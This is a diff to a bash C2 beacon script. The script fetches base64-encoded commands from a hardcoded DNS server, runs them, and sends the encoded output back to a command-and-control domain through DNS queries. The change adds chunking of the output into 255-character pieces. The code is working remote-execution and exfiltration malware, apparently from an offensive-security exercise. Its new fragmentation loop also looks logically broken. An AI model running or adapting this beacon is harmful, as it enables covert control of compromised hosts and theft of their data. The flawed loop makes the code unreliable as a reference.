@@ -7,6 +7,7 @@ dnsServer="129.21.130.212"
 f=false
 fName=""
 output=""
+frag=false
 
 # Pull down commands from server
 pull(){
@@ -20,14 +21,36 @@ pull(){
     else
         cmd=$(echo $cmd | base64 --decode)
         output=$($cmd)
-	return_output
+	    return_output
     fi
 }
 
 # return output of command back to C2 server
 return_output(){
 	output=$(echo $output | base64)
-	python client.py $output.$domain
+    arr=($output)                       # seperate into string by spaces in array
+    for x in "${arr[@]}"
+    do
+        size=${#x}                      # get size of string
+        tmp=$x
+        if [[ $size -ge 255 ]]; then    # need to frag
+            frag=true
+        else
+            python client.py $x.$domain 
+        fi
+        while $frag; do                 # continue fragging while size is greater equal to 255
+            tmp=${x:0:255}
+            python client.py $tmp.$domain
+            size=${#tmp}
+            if [[ $tmp -ge 255 ]]; then
+                frag=true
+            else
+                tmp=${tmp:0:$size}
+                python client.py $tmp.$domain
+                frag=false
+            fi
+        done
+    done
 }
 
 # Check in with server show beacon is still alive
